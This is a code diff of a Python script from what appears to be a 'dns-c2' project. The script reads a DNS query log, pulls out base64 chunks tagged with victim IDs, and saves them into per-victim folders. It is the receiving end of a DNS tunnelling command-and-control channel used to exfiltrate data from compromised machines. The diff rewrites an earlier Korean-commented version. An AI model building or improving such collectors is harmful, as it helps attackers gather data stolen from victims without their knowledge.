@@ -1,71 +1,56 @@
-import re
 import os
-import base64
+import re
 import logging
+from pathlib import Path
 
-# 로깅 설정
+# Logging setup
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
 
-def extract_chunks(log_file, chunks_dir):
-    # 피해자별 데이터 저장
-    victims = {}
-    meta_pattern = re.compile(r"메타데이터 저장: (\w+), 총 청크: (\d+)")
-    chunk_pattern = re.compile(r"청크 디코딩: (\w+), 원문: \"(.*?)\".*바이트: ([0-9a-f]+)")
-    chunk_idx_pattern = re.compile(r"저장된 청크: (\w+)/(\d+)")
-    
-    with open(log_file, "r", encoding="utf-8") as f:
-        for line in f:
-            # 메타데이터
-            meta_match = meta_pattern.search(line)
-            if meta_match:
-                victim, total = meta_match.group(1), meta_match.group(2)
-                if victim not in victims:
-                    victims[victim] = {"meta": None, "chunks": {}, "total": 0}
-                victims[victim]["meta"] = f"total:{total}".encode()
-                victims[victim]["total"] = int(total)
-                logging.info(f"Found meta for {victim}: total={total}")
-                continue
-            # 청크
-            chunk_match = chunk_pattern.search(line)
-            idx_match = chunk_idx_pattern.search(line)
-            if chunk_match and idx_match:
-                victim, idx = chunk_match.group(1), int(idx_match.group(2))
-                chunk_data = bytes.fromhex(chunk_match.group(3))  # 로그의 바이트 사용
-                if victim not in victims:
-                    victims[victim] = {"meta": None, "chunks": {}, "total": 0}
-                victims[victim]["chunks"][idx] = chunk_data
-                logging.info(f"Found chunk {idx} for {victim}, length={len(chunk_data)}")
-    
-    # 디스크에 저장
-    for victim, data in victims.items():
-        victim_dir = os.path.join(chunks_dir, victim)
-        os.makedirs(victim_dir, exist_ok=True)
-        
-        # 메타데이터 저장
-        if data["meta"]:
-            meta_path = os.path.join(victim_dir, "meta.bin")
-            with open(meta_path, "wb") as f:
-                f.write(data["meta"])
-            logging.info(f"Saved {meta_path}")
-        
-        # 청크 저장
-        for idx, chunk_data in data["chunks"].items():
-            chunk_path = os.path.join(victim_dir, f"chunk{idx}.bin")
-            with open(chunk_path, "wb") as f:
-                f.write(chunk_data)
-            logging.info(f"Saved {chunk_path}")
-        
-        # 청크 수 확인
-        if len(data["chunks"]) < data["total"]:
-            logging.warning(f"Missing chunks for {victim}: expected {data['total']}, got {len(data['chunks'])}")
-    
-    return victims
+# === 프로젝트 루트 기준으로 경로 계산 ===
+SCRIPT_DIR = Path(__file__).resolve().parent          # e.g. analyzer/
+PROJECT_ROOT = SCRIPT_DIR.parent                       # dns-c2/
+LOG_FILE = PROJECT_ROOT / "logs" / "raw" / "dns_query.log"
+RESULTS_DIR = PROJECT_ROOT / "logs" / "results"
+
+# Regex to match CHUNK lines
+CHUNK_PATTERN = re.compile(r"CHUNK:(\d{4}) \| VICTIM:([0-9a-f-]{36}) \| B64:([a-zA-Z0-9_-]+)")
+
+def extract_chunks():
+    # Ensure results directory exists
+    RESULTS_DIR.mkdir(parents=True, exist_ok=True)
+
+    # Read DNS query log
+    try:
+        with LOG_FILE.open("r") as f:
+            lines = f.readlines()
+    except Exception as e:
+        logging.error(f"Failed to read log file {LOG_FILE}: {e}")
+        return
+
+    processed_chunks = set()
+    for line in lines:
+        match = CHUNK_PATTERN.search(line)
+        if not match:
+            continue
+
+        idx, victim_id, b64_chunk = match.groups()
+        key = (idx, victim_id)
+        if key in processed_chunks:
+            continue
+
+        victim_dir = RESULTS_DIR / victim_id
+        victim_dir.mkdir(exist_ok=True)
+
+        chunk_file = victim_dir / f"chunk{idx}.b64"
+        try:
+            with chunk_file.open("w") as cf:
+                cf.write(b64_chunk)
+            logging.info(f"Saved chunk {idx} for victim {victim_id} to {chunk_file}")
+            processed_chunks.add(key)
+        except Exception as e:
+            logging.error(f"Failed to save chunk {idx} for victim {victim_id}: {e}")
 
 if __name__ == "__main__":
-    log_file = "/dns-c2/logs/raw/dns_query.log"
-    chunks_dir = "/dns-c2/chunks"
-    
-    if not os.path.exists(log_file):
-        logging.error(f"Log file {log_file} not found")
-    else:
-        extract_chunks(log_file, chunks_dir)
+    logging.info("Starting chunk extraction")
+    extract_chunks()
+    logging.info("Chunk extraction completed")
